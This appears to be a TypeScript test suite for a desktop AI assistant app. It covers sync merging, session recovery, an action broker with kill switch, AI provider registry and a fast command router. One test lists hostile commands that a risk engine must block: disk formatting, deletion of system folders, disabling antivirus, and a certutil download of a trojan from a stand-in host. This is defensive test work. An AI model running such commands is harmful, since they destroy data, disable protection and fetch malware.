/**
 * FloatGPT — Phase 1 Foundation Automated Verification Suite
 * 
 * Verifies core Phase 1 foundation architectural invariants:
 * 1. SyncMerger: Strict Orb vs Playground transcript isolation & task merge irreversibility
 * 2. Persistence & Recovery: State normalization, orphan repair, and session rollover
 * 3. Action Broker & Security: Capability gating, RiskEngine firewall, and Emergency KillSwitch
 * 4. AI Provider Abstraction: Registry resolution for Google, OpenAI, Groq, Anthropic, and Ollama
 * 5. FastRouter: Zero-token deterministic fast-path execution
 * 6. Observability: TokenTelemetry tracking and token estimation
 */

import { SyncMerger } from '../sync/merger';
import { RecoveryService } from '../lib/recovery';
import { performRollover } from '../state/store';
import { CapabilityRegistry } from '../fabric/registry';
import { ActionBroker } from '../fabric/actionBroker';
import { KillSwitch } from '../fabric/killSwitch';
import { RiskEngine } from '../fabric/riskEngine';
import { getProvider, getAvailableProviderIds } from '../ai/providers/registry';
import { normalizeAppState } from '../state/schema';
import { tryFastRoute } from '../ai/fastRouter';
import { TokenTelemetry } from '../ai/observability/telemetry';
import { AppState, INITIAL_STATE, Task, Goal, Project } from '../types';

let passed = 0;
let failed = 0;

function assert(condition: boolean, message: string) {
  if (condition) {
    console.log(`  ✅ PASS: ${message}`);
    passed++;
  } else {
    console.error(`  ❌ FAIL: ${message}`);
    failed++;
  }
}

async function runPhase1TestSuite() {
  console.log('========================================================');
  console.log('🧪 FloatGPT — Phase 1 Foundation Verification Test Suite');
  console.log('========================================================\n');

  // ─────────────────────────────────────────────────────────────
  // TEST 1: SyncMerger Transcript Isolation & Irreversibility
  // ─────────────────────────────────────────────────────────────
  console.log('--- Test 1: SyncMerger & Transcript Isolation ---');
  {
    const localState: AppState = {
      ...INITIAL_STATE,
      messages: [
        { id: 'm1', role: 'user', content: 'Local Orb message 1', timestamp: 1000 },
        { id: 'm2', role: 'assistant', content: 'Local Orb response 1', timestamp: 2000 }
      ],
      playgroundMessages: [
        { id: 'p1', role: 'user', content: 'Playground prompt 1', timestamp: 3000 }
      ],
      tasks: [
        {
          id: 'task_1',
          projectId: 'proj_1',
          title: 'Complete Phase 1 Audit',
          status: 'Completed',
          completedAt: 5000,
          createdAt: 1000
        }
      ]
    };

    // Simulate incoming Firestore payload from remote attempting to wipe or replace transcripts
    const remotePayload = {
      messages: [
        { id: 'remote_m1', role: 'user', content: 'Infiltrated remote message', timestamp: 9999 }
      ],
      playgroundMessages: [],
      tasks: [
        {
          id: 'task_1',
          projectId: 'proj_1',
          title: 'Complete Phase 1 Audit',
          status: 'Planned', // Attempting to revert a completed task!
          createdAt: 1000
        },
        {
          id: 'task_2',
          projectId: 'proj_1',
          title: 'New Remote Task',
          status: 'Planned',
          createdAt: 2000
        }
      ],
      projects: [
        {
          id: 'proj_1',
          goalId: 'goal_1',
          title: 'Foundation',
          status: 'Active',
          progress: 0,
          createdAt: 1000
        }
      ]
    };

    const merged = SyncMerger.merge(localState, remotePayload);

    // Assert Rule 1: Orb messages are unconditionally preserved
    assert(merged.messages.length === 2, 'Orb local transcript count is preserved');
    assert(merged.messages[0].content === 'Local Orb message 1', 'Orb local transcript content is unchanged');
    assert(merged.playgroundMessages!.length === 1, 'Playground local transcript is preserved');

    // Assert Rule 5: Task completion irreversibility
    const task1 = merged.tasks.find(t => t.id === 'task_1');
    assert(task1?.status === 'Completed', 'Task completion is strictly irreversible across sync');
    assert(task1?.completedAt === 5000, 'Task completedAt timestamp is preserved');

    // Assert new tasks are accepted
    assert(merged.tasks.some(t => t.id === 'task_2'), 'New remote task is accepted into merged state');

    // Assert project progress recalculation
    const proj1 = merged.projects.find(p => p.id === 'proj_1');
    assert(proj1?.progress === 50, `Project progress recalculated from completed tasks (got ${proj1?.progress}%)`);
  }

  // ─────────────────────────────────────────────────────────────
  // TEST 2: State Normalization, Recovery & Session Rollover
  // ─────────────────────────────────────────────────────────────
  console.log('\n--- Test 2: State Normalization, Recovery & Session Rollover ---');
  {
    // 2a. Schema normalization & healing of corrupted raw input
    const corruptedRaw = {
      tasks: 'not_an_array',
      messages: null,
      settings: {
        aiConfig: {
          selectedProvider: 'groq',
          selectedModels: { groq: 'invalid_unsupported_model_name' }
        }
      }
    };

    const normalized = normalizeAppState(corruptedRaw);
    assert(Array.isArray(normalized.tasks), 'Corrupted tasks field normalized to valid array');
    assert(Array.isArray(normalized.messages), 'Null messages field normalized to valid array');
    assert(normalized.settings.aiConfig.selectedModels.groq === 'llama-3.3-70b-versatile', 'Invalid Groq model fallback healed to default');

    // 2b. Overdue task detection & recovery drift analysis
    const now = Date.now();
    const driftState: AppState = {
      ...INITIAL_STATE,
      tasks: [
        {
          id: 'overdue_1',
          projectId: 'p1',
          title: 'Prepare quarterly report',
          status: 'Active',
          deadlineAt: now - 3600000, // 1 hour ago (overdue)
          createdAt: now - 7200000
        }
      ]
    };

    const recovered = RecoveryService.analyzeAndRecover(driftState);
    assert(recovered.recoveryState.status === 'Slight Drift', `Recovery status detected 1 overdue task as Slight Drift (got ${recovered.recoveryState.status})`);
    assert(recovered.recoveryState.tasksDeferredCount === 1, 'Soft overdue task was deferred into recovery schedule');

    // 2c. Session Rollover
    const activeState: AppState = {
      ...INITIAL_STATE,
      sessionId: 'session_2026_09_05',
      messages: [
        { id: 'm1', role: 'user', content: 'Review roadmap', timestamp: 1000 }
      ],
      tasks: [
        { id: 't1', projectId: 'p1', title: 'Done task', status: 'Completed', createdAt: 1000 },
        { id: 't2', projectId: 'p1', title: 'Pending task', status: 'Active', createdAt: 2000 }
      ]
    };

    const rolledOver = performRollover(activeState, 'session_2026_09_06');
    assert(rolledOver.sessionId === 'session_2026_09_06', 'New session ID is assigned');
    assert(rolledOver.messages.length === 0, 'New session starts with fresh conversation');
    assert(rolledOver.tasks.length === 1, 'Completed task archived, only pending task carried forward');
    assert(rolledOver.tasks[0].carriedOver === true, 'Carried over task is marked with carriedOver flag');
    assert(rolledOver.pastSessions.length === 1, 'Previous session is archived into pastSessions');
  }

  // ─────────────────────────────────────────────────────────────
  // TEST 3: Action Broker & Security Boundary
  // ─────────────────────────────────────────────────────────────
  console.log('\n--- Test 3: Action Broker & Security Boundary ---');
  {
    // 3a. Registered capability lookup
    const appOpenCap = CapabilityRegistry.get('application.open');
    assert(appOpenCap !== undefined, 'application.open capability is registered');
    assert(appOpenCap?.domain === 'application', 'application.open has domain "application"');

    // 3b. Emergency Kill Switch halts execution
    KillSwitch.trigger('Emergency test trigger');
    assert(KillSwitch.isHalted() === true, 'Emergency Kill Switch can be engaged');

    const blockedResult = await ActionBroker.dispatch({
      actionId: 'act_test_kill',
      capability: 'application.open',
      domain: 'application',
      target: { application: 'calculator' },
      arguments: { name: 'calculator' },
      source: 'user_explicit',
      risk: 'LEVEL_1_LOW_RISK',
      requiresConfirmation: false,
      reversible: false,
      description: 'Open calculator test'
    });
    assert(blockedResult.status === 'BLOCKED', 'Action Broker immediately blocks when KillSwitch is engaged');
    assert(blockedResult.error?.includes('Kill Switch') || false, 'KillSwitch error reason is reported');

    KillSwitch.reset();
    assert(KillSwitch.isHalted() === false, 'Emergency Kill Switch can be reset');

    // 3c. Unknown capability rejection
    const unknownResult = await ActionBroker.dispatch({
      actionId: 'act_test_unknown',
      capability: 'unregistered.malicious.capability',
      domain: 'system',
      target: {},
      arguments: {},
      source: 'user_explicit',
      risk: 'LEVEL_1_LOW_RISK',
      requiresConfirmation: false,
      reversible: false,
      description: 'Unregistered capability test'
    });
    assert(unknownResult.status === 'BLOCKED', 'Unregistered capability is immediately rejected');

    // 3d. RiskEngine catastrophic command detection
    const dangerousCommands = [
      'format c: /fs:ntfs',
      'Remove-Item -Recurse -Force C:\\Windows\\System32',
      'rm -rf /System/Library',
      'Set-MpPreference -DisableRealtimeMonitoring $true',
      'certutil -urlcache -f http://malicious.ru/trojan.exe'
    ];

    for (const cmd of dangerousCommands) {
      const evalResult = RiskEngine.evaluate({
        actionId: 'risk_test',
        capability: 'system.execute_command',
        domain: 'system',
        target: { content: cmd },
        arguments: { script: cmd },
        source: 'user_explicit',
        risk: 'LEVEL_1_LOW_RISK',
        requiresConfirmation: false,
        reversible: false,
        description: `Dangerous command test: ${cmd}`
      });
      assert(evalResult.blocked === true, `RiskEngine intercepted catastrophic command: "${cmd.slice(0, 30)}..."`);
    }
  }

  // ─────────────────────────────────────────────────────────────
  // TEST 4: AI Provider Abstraction Layer
  // ─────────────────────────────────────────────────────────────
  console.log('\n--- Test 4: AI Provider Abstraction Layer ---');
  {
    const availableIds = getAvailableProviderIds();
    assert(availableIds.includes('google'), 'Provider registry includes Google Gemini');
    assert(availableIds.includes('openai'), 'Provider registry includes OpenAI');
    assert(availableIds.includes('groq'), 'Provider registry includes Groq');
    assert(availableIds.includes('anthropic'), 'Provider registry includes Anthropic');
    assert(availableIds.includes('ollama'), 'Provider registry includes Ollama (Local)');

    const ollamaProvider = getProvider('ollama');
    assert(ollamaProvider !== null, 'getProvider("ollama") successfully resolves');
    assert(ollamaProvider?.id === 'ollama', 'Ollama provider ID matches');
    assert(typeof ollamaProvider?.generate === 'function', 'Ollama implements generate() contract');

    const googleProvider = getProvider('google');
    assert(googleProvider !== null && typeof googleProvider.generate === 'function', 'Google implements generate()');

    const groqProvider = getProvider('groq');
    assert(groqProvider !== null && typeof groqProvider.generate === 'function', 'Groq implements generate()');
  }

  // ─────────────────────────────────────────────────────────────
  // TEST 5: FastRouter Zero-Token Deterministic Operations
  // ─────────────────────────────────────────────────────────────
  console.log('\n--- Test 5: FastRouter Zero-Token Deterministic Paths ---');
  {
    const state = INITIAL_STATE;

    // 5a. System Clock & Date
    const timeRoute = await tryFastRoute('what is the current time?', state);
    assert(timeRoute.handled === true, 'FastRouter intercepts current time query');
    assert(timeRoute.actionExecuted === 'system_clock', 'system_clock action executed');
    assert(timeRoute.message?.includes('Current Local Time') || false, 'Current time formatted cleanly');

    const dateRoute = await tryFastRoute('tell me the date please', state);
    assert(dateRoute.handled === true, 'FastRouter intercepts date query with conversational polite words');

    // 5b. Website launching
    const websiteRoute = await tryFastRoute('open youtube', state);
    assert(websiteRoute.handled === true, 'FastRouter intercepts website launch ("open youtube")');
    assert(websiteRoute.data?.url === 'https://youtube.com', 'Resolved correct URL for YouTube');

    const linkedinRoute = await tryFastRoute('open linkedin.com', state);
    assert(linkedinRoute.handled === true, 'FastRouter intercepts "open linkedin"');
    assert(linkedinRoute.data?.url === 'https://linkedin.com', 'Resolved correct URL for LinkedIn');

    // 5c. Application launching
    const calcRoute = await tryFastRoute('launch calculator', state);
    assert(calcRoute.handled === true, 'FastRouter intercepts application launch ("launch calculator")');
    assert(calcRoute.data?.appName === 'calc', 'Resolved correct executable for calculator');

    // 5d. Deterministic OS Diagnostics (Zero-token, offline)
    const batteryRoute = await tryFastRoute('finding the battery level', state);
    assert(batteryRoute.handled === true, 'FastRouter intercepts battery level query');
    assert(batteryRoute.actionExecuted === 'diag_battery', 'Battery diag action executed');

    const folderRoute = await tryFastRoute('how many folders are present on desktop', state);
    assert(folderRoute.handled === true, 'FastRouter intercepts desktop folder count');
    assert(folderRoute.actionExecuted === 'diag_desktop_folders', 'Desktop folders diag action executed');

    const recRoute = await tryFastRoute('how many screen recordings are there in totla', state);
    assert(recRoute.handled === true, 'FastRouter intercepts screen recordings count (typo-tolerant)');
    assert(recRoute.actionExecuted === 'diag_screen_recordings', 'Screen recordings diag action executed');

    const ramHogRoute = await tryFastRoute('whihc app taking too much ram', state);
    assert(ramHogRoute.handled === true, 'FastRouter intercepts which app taking too much ram');
    assert(ramHogRoute.actionExecuted === 'diag_top_processes', 'Top processes RAM diag action executed');

    const taskmgrRoute = await tryFastRoute('open task bar and check how much ram is used', state);
    assert(taskmgrRoute.handled === true, 'FastRouter intercepts open task bar and check ram');
    assert(taskmgrRoute.actionExecuted === 'diag_open_taskmgr_and_ram', 'Task manager & RAM diag action executed');

    // 5e. Deterministic Media & Playback Controls (Play / Pause / Mute / Volume)
    const pauseRoute = await tryFastRoute('pause the video', state);
    assert(pauseRoute.handled === true, 'FastRouter intercepts "pause the video"');
    assert(pauseRoute.actionExecuted === 'media_pause', 'media_pause action executed');

    const playRoute = await tryFastRoute('play video', state);
    assert(playRoute.handled === true, 'FastRouter intercepts "play video"');
    assert(playRoute.actionExecuted === 'media_play', 'media_play action executed');

    const volumeUpRoute = await tryFastRoute('volume up', state);
    assert(volumeUpRoute.handled === true, 'FastRouter intercepts "volume up"');
    assert(volumeUpRoute.actionExecuted === 'media_volume_up', 'media_volume_up action executed');

    const muteRoute = await tryFastRoute('mute audio', state);
    assert(muteRoute.handled === true, 'FastRouter intercepts "mute audio"');
    assert(muteRoute.actionExecuted === 'media_mute', 'media_mute action executed');

    // 5f. Non-deterministic prompt passes through to LLM
    const llmRoute = await tryFastRoute('Help me design a marketing strategy for my startup', state);
    assert(llmRoute.handled === false, 'Complex prompt correctly passes through to AI orchestrator');
  }

  console.log('\n--- Test 5c: History compaction ---');
  {
    const { compactTurnContent, buildConversationContext } = await import('../ai/memory/context');
    const qr = compactTurnContent('**Scan WhatsApp QR once**\n\nFloatGPT opened a dedicated WhatsApp window.', false);
    assert(qr.includes('QR'), 'QR receipts collapse');
    assert(qr.length < 80, 'QR receipts stay tiny');
    const huge = 'x'.repeat(5000);
    assert(compactTurnContent(huge, false).length <= 1601, 'Older turns are capped');
    const turns = buildConversationContext(
      [
        { role: 'user', content: 'hi', timestamp: Date.now() },
        { role: 'assistant', content: huge, timestamp: Date.now() }
      ],
      7,
      2
    );
    assert(turns[1].content.length <= 4001, 'Latest history turn is capped');
  }

  console.log('\n--- Test 5b: API Key Failover Pool ---');
  {
    const { resolveProviderKeyPool, extractKeysFromBlob } = await import('../ai/config/keyPool');
    const extracted = extractKeysFromBlob('gsk_aaa111 gsk_bbb222\ngsk_ccc333', 'groq');
    assert(extracted.length === 3, `Parses 3 Groq keys from a pasted blob (got ${extracted.length})`);

    const prev2 = process.env.VITE_GROQ_API_KEY_2;
    const prev3 = process.env.VITE_GROQ_API_KEY_3;
    process.env.VITE_GROQ_API_KEY_2 = 'gsk_env_two';
    process.env.VITE_GROQ_API_KEY_3 = 'gsk_env_three';
    const pool = resolveProviderKeyPool('groq', 'gsk_primary_one');
    const total = (pool.primaryKey ? 1 : 0) + pool.fallbackKeys.length;
    assert(total >= 3, `Key pool includes primary + numbered env fallbacks (got ${total})`);
    assert(pool.fallbackKeys.includes('gsk_env_two'), 'Picks up VITE_GROQ_API_KEY_2');
    assert(pool.fallbackKeys.includes('gsk_env_three'), 'Picks up VITE_GROQ_API_KEY_3');
    if (prev2 === undefined) delete process.env.VITE_GROQ_API_KEY_2; else process.env.VITE_GROQ_API_KEY_2 = prev2;
    if (prev3 === undefined) delete process.env.VITE_GROQ_API_KEY_3; else process.env.VITE_GROQ_API_KEY_3 = prev3;
  }

  // ─────────────────────────────────────────────────────────────
  // TEST 6: Observability & TokenTelemetry
  // ─────────────────────────────────────────────────────────────
  console.log('\n--- Test 6: Observability & TokenTelemetry ---');
  {
    TokenTelemetry.reset();

    TokenTelemetry.record({
      provider: 'groq',
      model: 'llama-3.3-70b-versatile',
      routeType: 'FAST_PATH',
      inputTokensEstimated: 0,
      outputTokensEstimated: 25,
      latencyMs: 12,
      success: true
    });

    TokenTelemetry.record({
      provider: 'google',
      model: 'gemini-2.5-flash',
      routeType: 'LLM_TIER_1',
      inputTokensEstimated: 120,
      outputTokensEstimated: 85,
      latencyMs: 450,
      success: true
    });

    const summary = TokenTelemetry.getSummary();
    assert(summary.totalRequests === 2, 'TokenTelemetry recorded 2 requests');
    assert(summary.totalEstimatedTokens === (25 + 120 + 85), `Total estimated tokens accumulated correctly (got ${summary.totalEstimatedTokens})`);
    assert(summary.byProvider['groq']?.requests === 1, 'Groq request count tracked');
    assert(summary.byProvider['google']?.requests === 1, 'Google request count tracked');

    // Estimation helper
    const est = TokenTelemetry.estimateTokens('Hello world this is a test string');
    assert(typeof est === 'number' && est > 0, `estimateTokens returns positive integer (${est})`);
    assert(TokenTelemetry.estimateTokens('') === 0, 'estimateTokens handles empty string with 0');
  }

  // ─────────────────────────────────────────────────────────────
  // Final Results
  // ─────────────────────────────────────────────────────────────
  console.log('\n========================================================');
  console.log(`🏁 Phase 1 Foundation Test Results: ${passed} passed, ${failed} failed`);
  console.log('========================================================\n');

  if (failed > 0) {
    process.exit(1);
  }
}

runPhase1TestSuite().catch((err) => {
  console.error('Fatal error running Phase 1 test suite:', err);
  process.exit(1);
});
